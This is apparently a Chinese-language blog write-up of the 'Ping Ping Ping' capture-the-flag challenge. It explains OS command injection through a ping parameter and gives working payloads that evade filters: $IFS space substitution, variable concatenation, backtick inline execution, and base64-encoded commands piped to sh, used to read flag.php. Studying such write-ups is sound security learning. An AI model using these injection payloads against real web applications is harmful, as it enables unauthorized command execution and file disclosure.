{"blogid": "123029976", "writerAge": "码龄2年", "writerBlogNum": "96", "writerCollect": "174", "writerComment": "12", "writerFan": "83", "writerGrade": "4级", "writerIntegral": "1050", "writerName": "金 帛", "writerProfileAdress": "..\\..\\static\\writer_image\\profile_123029976.jpg", "writerRankTotal": "19460", "writerRankWeekly": "15647", "writerThumb": "75", "writerVisitNum": "68583", "blog_read_count": "2047", "blog_time": "已于 2022-02-20 19:22:34 修改", "blog_title": "BUUCTF之Ping Ping Ping", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"../../static/bootstrap/css/csdnstyle.css\" rel=\"stylesheet\"/>\n<div class=\"htmledit_views\" id=\"content_views\">\n<p id=\"main-toc\"><strong>目录</strong></p>\n<p id=\"%E5%AE%A1%E9%A2%98-toc\" style=\"margin-left:0px;\"><a href=\"#%E5%AE%A1%E9%A2%98\">审题</a></p>\n<p id=\"%E5%B8%B8%E7%94%A8%E7%9A%84%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-toc\" style=\"margin-left:40px;\"><a href=\"#%E5%B8%B8%E7%94%A8%E7%9A%84%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95\">常用的空格绕过方法</a></p>\n<p id=\"%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95-toc\" style=\"margin-left:0px;\"><a href=\"#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95\">解决方法</a></p>\n<p id=\"%E6%B3%95%E4%B8%80%C2%A0%20%C2%A0%20%C2%A0%20%C2%A0%20%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87%E6%B3%95-toc\" style=\"margin-left:40px;\"><a href=\"#%E6%B3%95%E4%B8%80%C2%A0%20%C2%A0%20%C2%A0%20%C2%A0%20%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87%E6%B3%95\">法一        拼接绕过法</a></p>\n<p id=\"%E6%B3%95%E4%BA%8C%C2%A0%20%C2%A0%20%C2%A0%20%C2%A0%20%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C%E6%B3%95-toc\" style=\"margin-left:40px;\"><a href=\"#%E6%B3%95%E4%BA%8C%C2%A0%20%C2%A0%20%C2%A0%20%C2%A0%20%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C%E6%B3%95\">法二        内联执行法</a></p>\n<p id=\"%E6%B3%95%E4%B8%89%C2%A0%20%C2%A0%20%C2%A0%20%C2%A0%20sh%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87%E6%B3%95-toc\" style=\"margin-left:40px;\"><a href=\"#%E6%B3%95%E4%B8%89%C2%A0%20%C2%A0%20%C2%A0%20%C2%A0%20sh%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87%E6%B3%95\">法三        sh编码绕过法</a></p>\n<hr id=\"hr-toc\"/>\n<p></p>\n<h1 id=\"%E5%AE%A1%E9%A2%98\">审题</h1>\n<p>点开链接</p>\n<p><img alt=\"\" height=\"81\" src=\"..\\..\\static\\image\\39e35a4070bc46bba5aff3c95aa22d09.png\" width=\"263\"/></p>\n<p>根据题目提示随便试试构造payload</p>\n<p>inurl?ip=666</p>\n<p><img alt=\"\" height=\"222\" src=\"..\\..\\static\\image\\d6fa2e8371b14fd8810c813e76b14eef.png\" width=\"1105\"/> 有返回，参数ip的值就是要ping的内容</p>\n<p>这里我们知道有Windows和Linux通用的命令分隔符%0a、| 、&amp; 、 ；</p>\n<blockquote>\n<p>; : 命令1 ; 命令2                  ——先执行命令1再执行命令2</p>\n<p>&amp; ：命令1 &amp; 命令2              ——先执行命令1再执行命令2</p>\n<p>| ： 命令1 &amp; 命令2               ——只执行命令2</p>\n</blockquote>\n<p>先试试看Windows特有的命令dir，使用分隔符|</p>\n<p>构造payload  ， <span style=\"color:#fe2c24;\">inurl?ip=127.0.0.1 | dir</span></p>\n<p><img alt=\"\" height=\"185\" src=\"..\\..\\static\\image\\78760aaa61a74f52bb9c493b224fd1be.png\" width=\"1200\"/>  emmm，好像是空格符被过滤掉了，把空格符删去再试试看</p>\n<p></p>\n<p><img alt=\"\" height=\"185\" src=\"..\\..\\static\\image\\80c05ddb0acb41468568a4ee96d76b38.png\" width=\"1182\"/></p>\n<p>没反应，操作系统应该不是Windows了，输入命令ls，查看当前目录的文件 </p>\n<p><img alt=\"\" height=\"302\" src=\"..\\..\\static\\image\\165801b0613a418188b90d95d82f86da.png\" width=\"1158\"/></p>\n<p> 找到了放flag的文件，但是要打开该文件得用到命令cat flag.php ， 必须绕过空格过滤</p>\n<h2 id=\"%E5%B8%B8%E7%94%A8%E7%9A%84%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95\">常用的空格绕过方法</h2>\n<blockquote>\n<p>$IFS              </p>\n<p>$IFS$6                               ——后面的数字6换成其他数字也行</p>\n<p>${IFS} </p>\n<p>&lt;</p>\n<p>&lt;&gt;</p>\n<p>{cat,flag.php}                      ——这里把，替换成了空格键</p>\n<p>%20                                     ——代表space键</p>\n<p>%09                                     ——代表Tab键</p>\n</blockquote>\n<p>不着急，先试着打开index.php查看过滤方法</p>\n<p>使用命令<span style=\"color:#fe2c24;\">cat$IFS$6index.php</span></p>\n<p>接着查看网站源码 </p>\n<p><img alt=\"\" height=\"602\" src=\"..\\..\\static\\image\\db98feddc6ef41969f2696892e253001.png\" width=\"1200\"/></p>\n<p>what's up 好多绕过的方法都被过滤了</p>\n<h1 id=\"%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95\">解决方法</h1>\n<hr/>\n<h2 id=\"%E6%B3%95%E4%B8%80%C2%A0%20%C2%A0%20%C2%A0%20%C2%A0%20%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87%E6%B3%95\">法一        拼接绕过法</h2>\n<p>这个方法主要是绕过对flag正则匹配的检测，有点悬，目前好像只能拼接末尾的g\\ag\\lag，我也不太清楚为啥</p>\n<p>将lag替换成x，绕过对flag的正匹检测，构建payload</p>\n<blockquote>\n<p><span style=\"color:#fe2c24;\">inurl?ip=127.0.0.1;x=lag;cat$IFS$6f$x.php</span></p>\n</blockquote>\n<p>查看网站源码后得到flag</p>\n<p><img alt=\"\" height=\"256\" src=\"..\\..\\static\\image\\16d0b1558ca349bdb39d35379d685b1f.png\" width=\"1200\"/></p>\n<hr/>\n<h2 id=\"%E6%B3%95%E4%BA%8C%C2%A0%20%C2%A0%20%C2%A0%20%C2%A0%20%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C%E6%B3%95\">法二        内联执行法</h2>\n<p>可以看到代码没有过滤掉符号`  ， 所以可以利用内联执行的方式直接打开flag文件</p>\n<p>先执行命令ls，再把ls得到的文件名全部用命令cat打开，构建payload </p>\n<blockquote>\n<p><span style=\"color:#fe2c24;\">inurl?ip=127.0.0.1;cat$IFS$6`ls`</span></p>\n</blockquote>\n<p>再查看源码后拿到flag</p>\n<p><img alt=\"\" height=\"722\" src=\"..\\..\\static\\image\\b26b92ea743c46688a27e72eb4811a70.png\" width=\"1200\"/></p>\n<hr/>\n<h2 id=\"%E6%B3%95%E4%B8%89%C2%A0%20%C2%A0%20%C2%A0%20%C2%A0%20sh%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87%E6%B3%95\">法三        sh编码绕过法</h2>\n<p>使用方法</p>\n<p><span style=\"color:#fe2c24;\">echo 命令编码|base64 -d|sh</span></p>\n<ul><li> sh可以换成bash ， 但是题目过滤掉了</li><li>也可以换成其他的编码形式，这里用base64的</li><li>空格用$IFS$6替换掉</li><li>cat flag.php 的base64编码为Y2F0IGZsYWcucGhw</li></ul>\n<p>构造payload  ， 相当于执行命令cat flag.php</p>\n<blockquote>\n<p><span style=\"color:#fe2c24;\">inurl?ip=127.0.0.1;echo$IFS$6Y2F0IGZsYWcucGhw|base64$IFS$6-d|sh</span></p>\n</blockquote>\n<p>再查看网站源码，拿到flag</p>\n<p><img alt=\"\" height=\"235\" src=\"..\\..\\static\\image\\8e33a55ec8c14d6b98820dd5a883c27b.png\" width=\"1200\"/></p>\n<hr/>\n<p><strong>参考文章：</strong></p>\n<blockquote>\n<p><a href=\"https://blog.csdn.net/satasun/article/details/106266372\" title=\"[GXYCTF2019]Ping Ping Ping_satasun的博客-CSDN博客\">[GXYCTF2019]Ping Ping Ping_satasun的博客-CSDN博客</a></p>\n<p><a href=\"https://blog.csdn.net/qq_42812036/article/details/104297163\" title=\"[GXYCTF2019]Ping Ping Ping {命令执行总结}_昂首下楼梯的博客-CSDN博客\">[GXYCTF2019]Ping Ping Ping {命令执行总结}_昂首下楼梯的博客-CSDN博客</a></p>\n<p><a href=\"https://blog.csdn.net/wojiushilsy/article/details/106129503\" title=\"linux常见绕过方法_wojiushilsy的博客-CSDN博客\">linux常见绕过方法_wojiushilsy的博客-CSDN博客</a></p>\n<p><a href=\"https://blog.csdn.net/Mr_Shiyang/article/details/108019749\" title=\"Linux/CTF命令注入及绕过_Mr_Shiyang的博客-CSDN博客_linux 命令注入绕过\">Linux/CTF命令注入及绕过_Mr_Shiyang的博客-CSDN博客_linux 命令注入绕过</a></p>\n</blockquote>\n</div>\n</div>", "first_tag": "PHP", "cpp": 0, "csharp": 0, "python": 0, "javascript": 0, "java": 0, "sql": 0, "php": 1, "time": "2022-02-20 19:22:34", "summary": "目录审题常用的空格绕过方法解决方法法一拼接绕过法法二内联执行法法三编码绕过法审题点开链接根据题目提示随便试试构造有返回，参数的值就是要的内容这里我们知道有和通用的命令分隔符、、、；命令命令先执行命令再"}